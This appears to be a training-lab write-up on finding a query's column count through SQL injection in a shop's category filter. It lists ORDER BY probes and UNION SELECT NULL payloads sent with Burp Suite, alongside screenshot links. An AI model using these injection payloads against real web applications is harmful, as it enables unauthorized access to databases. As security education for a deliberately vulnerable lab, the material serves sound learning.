# Lab 03: SQL injection UNION attack, determining the number of columns returned by the query

**Goal**: Determine the number of columns returned by the query by performing a SQL injection UNION attack that returns an additional row containing null values.

This lab contains a SQL injection vulnerability in the product category filter. The results from the query are returned in the application's response, so you can use a `UNION` attack to retrieve data from other tables.

---

## 🎯 Solution

1. Use Burp Suite to intercept and modify the request that sets the product category filter.
2. Modify the `category` parameter, giving it the value `'+UNION+SELECT+NULL--`. Observe that an error occurs.
3. Modify the `category` parameter to add an additional column containing a null value:
   ```sql
   '+UNION+SELECT+NULL,NULL--
   ```
4. Continue adding null values until the error disappears and the response includes additional content containing the null values.

![Lab 3 Solution Summary](Pasted%20image%2020260801021826.png)

---

## 🛠️ Step-by-Step Guide

### Step 1: Access Category Filter
Click any product category to observe the request parameter:
```http
GET /filter?category=Gifts HTTP/1.1
```

### Step 2: Test Column Count with `ORDER BY`
Increment the column index in the payload:
```http
/filter?category=Gifts'+ORDER+BY+1--
/filter?category=Gifts'+ORDER+BY+2--
/filter?category=Gifts'+ORDER+BY+3--
/filter?category=Gifts'+ORDER+BY+4--
```

- **Order By 1**:
![Lab 3 Order By 1](Pasted%20image%2020260801022309.png)

- **Order By 2**:
![Lab 3 Order By 2](Pasted%20image%2020260801022424.png)

- **Order By 3**:
![Lab 3 Order By 3](Pasted%20image%2020260801022454.png)

- **Order By 4**:
![Lab 3 Order By 4 Error](Pasted%20image%2020260801022617.png)

> [!NOTE]
> Receiving an **Error** on `ORDER BY 4` confirms that the query returns **3 columns**.

### Step 3: Verify with `UNION SELECT NULL`
Inject 3 NULL values corresponding to the column count:
```http
/filter?category=Gifts'+UNION+SELECT+NULL,NULL,NULL--
```

![Lab 3 Union Select Null Solved](Pasted%20image%2020260801023020.png)

> [!SUCCESS]
> **Lab Solved**: No error occurred and an extra row with NULL values was returned!